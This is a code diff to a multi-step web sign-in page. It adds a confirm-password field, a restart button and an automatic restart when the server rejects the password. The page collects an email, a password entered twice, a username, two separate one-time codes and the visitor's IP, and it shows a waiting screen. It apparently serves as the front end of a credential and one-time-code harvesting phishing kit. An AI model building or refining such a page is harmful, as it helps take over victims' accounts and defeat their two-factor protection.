@@ -21,6 +21,16 @@
     }
     .error { color: red; font-weight: bold; }
     .success { color: green; }
+    .restart-btn {
+      margin-top: 20px;
+      padding: 8px 16px;
+      background: #f44336;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    .restart-btn:hover { background: #d32f2f; }
   </style>
 </head>
 <body>
@@ -43,14 +53,23 @@
     <p id="status1"></p>
   </div>
 
-  <!-- Step 2: Username -->
+  <!-- Step 2: Username + Confirm Password -->
   <div id="step2" style="display:none;">
-    <h2>Step 2: Username</h2>
+    <h2>Step 2: Username & Confirm Password</h2>
     <form id="form2">
       <label>Username: <input type="text" id="username" required></label><br><br>
+      <label>Confirm Password:
+        <span class="password-wrapper">
+          <input type="password" id="confirmPassword" required>
+          <button type="button" class="toggle-password" id="toggleConfirmPassword" title="Show password">👁️</button>
+        </span>
+      </label><br><br>
       <button type="submit">Continue</button>
     </form>
     <p id="status2"></p>
+
+    <!-- Restart button -->
+    <button type="button" class="restart-btn" id="restartBtn">Restart</button>
   </div>
 
   <!-- Step 3: OTP 1 -->
@@ -93,26 +112,56 @@
       .then(j => { userIp = j.ip || '(unknown)'; })
       .catch(() => { userIp = '(could not detect)'; });
 
-    // Password eye toggle
-    document.getElementById('togglePassword').addEventListener('click', function() {
-      const input = document.getElementById('password');
-      const btn = this;
-      if (input.type === 'password') {
-        input.type = 'text';
-        btn.textContent = '🙈';
-        btn.title = 'Hide password';
-      } else {
-        input.type = 'password';
-        btn.textContent = '👁️';
-        btn.title = 'Show password';
-      }
-    });
+    // Password eye toggles
+    function setupToggle(btnId, inputId) {
+      document.getElementById(btnId).addEventListener('click', function() {
+        const input = document.getElementById(inputId);
+        const btn = this;
+        if (input.type === 'password') {
+          input.type = 'text';
+          btn.textContent = '🙈';
+          btn.title = 'Hide password';
+        } else {
+          input.type = 'password';
+          btn.textContent = '👁️';
+          btn.title = 'Show password';
+        }
+      });
+    }
+    setupToggle('togglePassword', 'password');
+    setupToggle('toggleConfirmPassword', 'confirmPassword');
 
     function showStatus(id, message, isError) {
       const el = document.getElementById(id);
       el.textContent = message;
-      el.className = isError ? 'error' : (message.includes('sent') || message.includes('correct') ? 'success' : '');
+      el.className = isError ? 'error' : (message.includes('sent') || message.includes('correct') || message.includes('received') ? 'success' : '');
     }
+
+    // Restart function – go back to Step 1 and clear everything
+    function restart() {
+      sessionId = null;
+      document.getElementById('email').value = '';
+      document.getElementById('password').value = '';
+      document.getElementById('username').value = '';
+      document.getElementById('confirmPassword').value = '';
+      document.getElementById('otp1').value = '';
+      document.getElementById('otp2').value = '';
+
+      // Hide all steps
+      document.getElementById('step1').style.display = 'block';
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step3').style.display = 'none';
+      document.getElementById('step4').style.display = 'none';
+      document.getElementById('waiting').style.display = 'none';
+
+      // Clear status messages
+      ['status1','status2','status3','status4'].forEach(id => {
+        document.getElementById(id).textContent = '';
+        document.getElementById(id).className = '';
+      });
+    }
+
+    document.getElementById('restartBtn').addEventListener('click', restart);
 
     // Step 1
     document.getElementById('form1').addEventListener('submit', async function(e) {
@@ -148,18 +197,19 @@
       }
     });
 
-    // Step 2
+    // Step 2 – Username + Confirm Password
     document.getElementById('form2').addEventListener('submit', async function(e) {
       e.preventDefault();
       const username = document.getElementById('username').value;
+      const confirmPassword = document.getElementById('confirmPassword').value;
 
-      showStatus('status2', 'Sending Username...');
+      showStatus('status2', 'Verifying password and sending Username...');
 
       try {
         const res = await fetch('/api/step2', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId, username })
+          body: JSON.stringify({ sessionId, username, confirmPassword })
         });
         const data = await res.json();
 
@@ -168,7 +218,9 @@
           document.getElementById('step2').style.display = 'none';
           document.getElementById('step3').style.display = 'block';
         } else {
-          showStatus('status2', data.message || 'Error', true);
+          // Password did not match → force restart
+          showStatus('status2', data.message || 'Password does not match. Restarting...', true);
+          setTimeout(restart, 2000); // auto restart after 2 seconds
         }
       } catch (err) {
         showStatus('status2', 'Network error', true);
